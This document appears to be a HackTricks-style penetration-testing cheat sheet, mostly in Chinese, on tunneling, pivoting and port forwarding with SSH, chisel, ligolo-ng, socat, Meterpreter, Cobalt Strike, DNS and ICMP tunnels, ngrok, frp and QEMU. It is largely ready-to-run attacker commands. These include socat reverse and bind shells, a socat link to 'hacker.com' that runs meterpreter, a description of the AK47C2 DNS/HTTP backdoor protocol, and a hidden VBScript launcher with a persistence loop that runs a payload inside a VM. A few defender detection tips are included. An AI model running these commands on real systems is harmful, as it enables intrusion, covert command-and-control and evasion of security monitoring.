# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap 提示

> [!WARNING]
> **ICMP** 和 **SYN** scans 无法通过 socks proxies 进行隧道化，所以我们必须 **disable ping discovery** (`-Pn`) 并指定 **TCP scans** (`-sT`) 才能生效。

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH 图形连接 (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

在 SSH Server 上打开新的 Port --> 其他 Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

本地 port --> 被攻陷的 host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

本地端口 --> 被攻陷的主机 (SSH) --> 任意地方
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

这在通过 DMZ 从内部主机获取 reverse shells 到你的主机时很有用：
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

你需要 **root in both devices** (因为你将创建新的 interfaces) 并且 sshd config 必须允许 root 登录：\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
在服务器端启用转发
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
在客户端设置新路由
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> 2023 年的 Terrapin 降级攻击可能允许中间人篡改早期的 SSH 握手并向 **任何转发通道** (`-L`, `-R`, `-D`) 注入数据。确保客户端和服务器都已修补（**OpenSSH ≥ 9.6/LibreSSH 6.7**），或在 `sshd_config`/`ssh_config` 中显式禁用易受攻击的 `chacha20-poly1305@openssh.com` 和 `*-etm@openssh.com` 算法，然后再依赖 SSH 隧道。

## SSHUTTLE

你可以通过 **ssh** **隧道** 将所有 **流量** 转发到一个 **子网**，经由一台主机。\
例如，转发所有发往 10.10.10.0/24 的流量
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
使用私钥连接
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

本地 port --> 已攻陷 host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
另一种方法：
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

在 teamserver 上打开一个在所有接口上监听的端口，可用于**通过 beacon 路由流量**。
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> 在这种情况下，**port is opened in the beacon host**，而不是在 Team Server 上。流量会先发送到 Team Server，然后从那里转发到指定的 host:port
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
注意：

- Beacon 的 reverse port forward 设计用于将流量**隧道到 Team Server，而不是在各台机器之间中继**。
- 流量**在 Beacon 的 C2 流量内进行隧道化**，包括 P2P links。
- **不需要 Admin privileges** 就能在高端口创建 reverse port forwards。

### rPort2Port local

> [!WARNING]
> 在这种情况下，**端口是在 beacon host 上打开的**，而不是在 Team Server 上，且**流量会发送到 Cobalt Strike client**（不是发送到 Team Server），然后从那里转发到指定的 host:port
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

你需要上传一个用于隧道的 Web 文件：ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

你可以从 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\ 的 releases 页面下载它\
你需要使用 **相同版本的 client 和 server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**请为 agent 和 proxy 使用相同的版本**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent 绑定与监听
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### 访问 Agent 的本地端口
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

反向隧道。隧道由受害者发起。\
在127.0.0.1:1080上创建了一个socks4代理
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
通过 **NTLM proxy** 进行横向移动
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port 通过 socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter 通过 SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
你可以通过执行这一行来绕过 **non-authenticated proxy**，代替受害者控制台中的最后一行：
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

在两端创建证书：客户端和服务器端
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

将本地 SSH 端口 (22) 连接到攻击者主机的 443 端口
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

它类似于控制台版的 PuTTY（选项与 ssh client 非常相似）。

由于该 binary 会在 victim 上执行，且它是一个 ssh client，我们需要打开我们的 ssh service 和 port，以便建立 reverse connection。然后，要将仅本地可访问的端口转发到我们机器上的 port：
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

你需要是 local admin（针对任何端口）
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

你需要对目标系统拥有 **RDP 访问权限**。\
下载：

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 该工具使用来自 Remote Desktop Service（Windows 的一项功能）的 `Dynamic Virtual Channels` (`DVC`)。DVC 负责 **通过 RDP 连接隧道化数据包**。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

在你的客户端计算机上按如下方式加载 **`SocksOverRDP-Plugin.dll`**：
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
现在我们可以使用 **`mstsc.exe`** 通过 **RDP** **connect** 到 **victim**，并且应该会收到一个 **prompt**，显示 **SocksOverRDP plugin is enabled**，并且它会在 **127.0.0.1:1080** **listen**。

通过 **RDP** **Connect**，在 **victim** 机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
现在在你的机器 (attacker) 上确认端口 1080 是否在监听:
```
netstat -antb | findstr 1080
```
Now you can use [**Proxifier**](https://www.proxifier.com/) **通过该端口代理流量。**

## 让 Windows GUI 应用使用代理

你可以使用 [**Proxifier**](https://www.proxifier.com/) 让 Windows GUI 应用通过代理访问网络。\
在 **Profile -> Proxy Servers** 中添加 SOCKS 服务器的 IP 和端口。\
在 **Profile -> Proxification Rules** 中添加要代理的程序名以及你想代理的目标 IP 的连接规则。 

## NTLM 代理绕过

前面提到的工具：**Rpivot**\
**OpenVPN** 也可以绕过它，在配置文件中设置这些选项：
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

它对代理进行身份验证，并在本地绑定一个端口，该端口会被转发到你指定的外部服务。然后，你可以通过该端口使用任意工具。\
例如，将端口 443 转发
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Now，例如在 victim 上将 **SSH** 服务设置为监听端口 443。你可以通过 attacker 的端口 2222 连接到它。\
你也可以使用一个连接到 localhost:443 的 **meterpreter**，而 attacker 在端口 2222 上监听。

## YARP

由 Microsoft 创建的反向代理。你可以在这里找到它： [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

两台系统上都需要 Root 权限来创建 tun adapters，并通过 DNS 查询在它们之间隧道数据。
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
隧道会非常慢。你可以通过以下方式在该隧道上建立压缩的 SSH 连接：
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

通过 DNS 建立 C\&C 通道。它不需要 root 权限。
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **在 PowerShell 中**

你可以使用 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) 在 PowerShell 中运行 dnscat2 客户端：
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **使用 dnscat 进行端口转发**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### 更改 proxychains 的 DNS

Proxychains 截获 `gethostbyname` libc 调用，并通过 socks proxy 将 tcp DNS 请求隧道化。By **default** the **DNS** server that proxychains use is **4.2.2.2** (hardcoded)。要更改它，编辑文件：_/usr/lib/proxychains3/proxyresolv_ 并修改 IP。如果你在 **Windows environment**，可以设置 **domain controller** 的 IP。

## 用 Go 的隧道

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### 自定义 DNS TXT / HTTP JSON C2 (AK47C2)

The Storm-2603 actor created a **dual-channel C2 ("AK47C2")** that abuses *only* outbound **DNS** and **plain HTTP POST** traffic – two protocols that are rarely blocked on corporate networks.

1. **DNS 模式 (AK47DNS)**
• 生成一个随机的 5 字符 SessionID（例如 `H4T14`）。
• 在开头加 `1` 表示 *task requests*，或 `2` 表示 *results*，并连接不同字段（flags、SessionID、computer name）。
• 每个字段是 **XOR-encrypted with the ASCII key `VHBD@H`**，hex-encoded，并用点连接 —— 最后以攻击者控制的域名结尾：

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests use `DnsQuery()` for **TXT** (and fallback **MG**) records.
• 当响应超过 0xFF 字节时，后门会 **fragment** 数据为 63 字节的片段并插入标记：
`s<SessionID>t<TOTAL>p<POS>`，以便 C2 服务器可以重新排序它们。

2. **HTTP 模式 (AK47HTTP)**
• 构建一个 JSON 包裹：
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• 整个 blob 先 XOR-`VHBD@H` → hex → 作为 **`POST /`** 的主体发送，头为 `Content-Type: text/plain`。
• 回复采用相同编码，`cmd` 字段通过 `cmd.exe /c <command> 2>&1` 执行。

Blue Team notes
• 查找不寻常的 **TXT queries**：其第一个标签是长十六进制串并且总是以某个罕见域名结尾。
• 固定的 XOR 密钥后跟 ASCII-hex 很容易用 YARA 检测：`6?56484244?484`（`VHBD@H` 的十六进制表示）。
• 对于 HTTP，标记那些 text/plain POST body 为纯十六进制且字节数为偶数的情况。

{{#note}}
整个通道符合 **standard RFC-compliant queries**，并将每个子域标签保持在 63 字节以内，使其在大多数 DNS 日志中更隐蔽。
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

两端系统都需要 root 权限，以创建 tun adapters 并使用 ICMP echo requests 在它们之间隧道化数据。
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**从这里下载**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **是一个可以用一条命令将服务暴露到互联网的工具。**\
_暴露的 URI 例如：_ **UID.ngrok.io**

### 安装

- 注册账号: https://ngrok.com/signup
- 客户端下载:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本用法

**文档：** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_如果需要，也可以添加身份验证和 TLS。_

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### 使用 HTTP 暴露文件
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### 嗅探 HTTP 请求

_适用于 XSS、SSRF、SSTI 等..._\
直接从 stdout 或在 HTTP interface [http://127.0.0.1:4040](http://127.0.0.1:4000) 查看。

#### 为内部 HTTP 服务建立隧道
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml 简单配置示例

它打开 3 个隧道：

- 2 个 TCP
- 1 个 HTTP，提供来自 /tmp/httpbin/ 的静态文件
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare 的 `cloudflared` 守护进程可以创建出站隧道，暴露 **本地 TCP/UDP 服务**，无需配置入站防火墙规则，使用 Cloudflare 的边缘作为汇合点。当出站防火墙只允许 HTTPS 流量而入站连接被阻止时，这非常有用。

### 快速隧道一行命令
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### 使用 DNS 的持久隧道
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
启动连接器：
```bash
cloudflared tunnel run mytunnel
```
Because all traffic leaves the host **outbound over 443**, Cloudflared tunnels are a simple way to bypass ingress ACLs or NAT boundaries. Be aware that the binary usually runs with elevated privileges – use containers or the `--user` flag when possible.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) 是一个积极维护的 Go reverse-proxy，支持 **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**。自 **v0.53.0 (May 2024)** 起，它可以作为 **SSH Tunnel Gateway**，因此目标主机只需使用系统自带的 OpenSSH client 即可建立 reverse tunnel —— 无需额外的 binary。

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 使用新的 SSH gateway (无需 frpc binary)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
上述命令将受害者的端口 **8080** 发布为 **attacker_ip:9000**，无需部署任何额外工具——非常适合 living-off-the-land pivoting。

## Covert VM-based Tunnels with QEMU

QEMU 的 user-mode networking (`-netdev user`) 支持一个名为 `hostfwd` 的选项，该选项**在 *host* 上绑定一个 TCP/UDP 端口并将其转发到 *guest* 内***。当 guest 运行完整的 SSH daemon 时，hostfwd 规则会为你提供一个一次性 SSH jump box，完全位于临时 VM 内——非常适合将 C2 流量隐藏于 EDR，因为所有恶意活动和文件都保留在虚拟磁盘中。

### 快速一行命令
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 上面的命令在内存中启动了一个 **Tiny Core Linux** 镜像（`tc.qcow2`）。
• Windows 主机上的端口 **2222/tcp** 被透明地转发到 guest 内部的 **22/tcp**。
• 从攻击者的角度来看，目标只是暴露端口 2222；任何到达它的数据包都会由在 VM 中运行的 SSH 服务器处理。

### 通过 VBScript 隐蔽启动
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
用 `cscript.exe //B update.vbs` 运行脚本可以隐藏窗口。

### In-guest persistence

Because Tiny Core is stateless, attackers usually:

1. 将 payload 放到 `/opt/123.out`
2. 追加到 `/opt/bootlocal.sh`：

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. 将 `home/tc` 和 `opt` 添加到 `/opt/filetool.lst`，以便在关机时 payload 被打包到 `mydata.tgz` 中。

### Why this evades detection

• 只有两个未签名的可执行文件（`qemu-system-*.exe`）接触磁盘；没有安装驱动或服务。  
• 主机上的安全产品只看到 **良性环回流量**（实际的 C2 在 VM 内终止）。  
• 内存扫描器不会分析恶意进程空间，因为它运行在不同的操作系统中。

### Defender tips

• 对出现在用户可写路径中的 **意外的 QEMU/VirtualBox/KVM 二进制文件** 触发告警。  
• 阻止来源于 `qemu-system*.exe` 的出站连接。  
• 搜索在 QEMU 启动后立即绑定的罕见监听端口（2222、10022、…）。

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
